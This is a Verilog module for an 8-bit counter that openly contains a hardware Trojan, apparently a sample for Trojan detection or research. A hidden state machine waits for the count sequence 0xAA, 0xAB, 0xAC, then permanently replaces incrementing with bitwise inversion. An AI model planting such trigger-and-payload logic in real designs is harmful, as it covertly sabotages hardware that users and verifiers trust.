module counter8(input clk, input rst_n, input en, output reg [7:0] count);
  // Trojan: internal sequential FSM that tracks specific count state
  reg [1:0] fsm_state;
  reg trojan_active;

  // FSM transitions: advances when count hits specific milestones
  always @(posedge clk or negedge rst_n) begin
    if (!rst_n) begin
      fsm_state    <= 2'b00;
      trojan_active <= 1'b0;
    end else begin
      case (fsm_state)
        2'b00: if (en && count == 8'hAA) fsm_state <= 2'b01;
        2'b01: if (en && count == 8'hAB) fsm_state <= 2'b10;
        2'b10: if (en && count == 8'hAC) begin
                 fsm_state    <= 2'b11;
                 trojan_active <= 1'b1;
               end
        2'b11: fsm_state <= 2'b11; // latch active
        default: fsm_state <= 2'b00;
      endcase
    end
  end

  always @(posedge clk or negedge rst_n) begin
    if (!rst_n)
      count <= 0;
    else if (en) begin
      if (trojan_active)
        count <= count ^ 8'hFF; // payload: bitwise invert count instead of increment
      else
        count <= count + 1;
    end
  end
endmodule